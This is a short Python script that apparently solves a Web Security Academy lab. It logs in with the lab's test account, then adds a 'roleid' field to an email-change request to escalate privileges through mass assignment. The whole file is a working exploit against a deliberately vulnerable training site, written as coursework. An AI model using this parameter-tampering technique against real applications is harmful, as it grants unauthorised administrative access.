import requests

site = '0af2002203d31a9580437ba800110029.web-security-academy.net'

s = requests.Session()
login_url = f'https://{site}/login'
login_data = { 'password' : 'peter', 'username' : 'wiener'}
resp = s.post(login_url, data=login_data)

change_url = f'https://{site}/my-account/change-email'
json_data = {'email' : 'OdinID@pdx.edu'}
resp = s.post(change_url,json=json_data, allow_redirects = False)
print(resp.status_code)
print(resp.text)

json_data = {'email' : 'OdinID@pdx.edu', 'roleid' : 2}
resp = s.post(change_url,json=json_data, allow_redirects = False)
print(resp.text)